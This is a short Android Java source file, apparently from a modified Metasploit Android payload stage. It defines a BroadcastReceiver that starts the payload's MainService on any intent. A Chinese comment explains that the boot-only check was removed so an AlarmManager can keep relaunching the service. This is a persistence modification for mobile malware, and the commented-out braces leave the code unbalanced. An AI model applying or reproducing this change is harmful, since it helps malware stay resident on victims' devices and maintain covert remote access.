package com.metasploit.stage;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class MainBroadcastReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
       //MainService.java中增加的代码AlarmManager需要一个Receiver。将判断代码——只接收ACTION_BOOT_COMPLETED整行删除
        // if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            MainService.startService(context);
        }
    }
//}
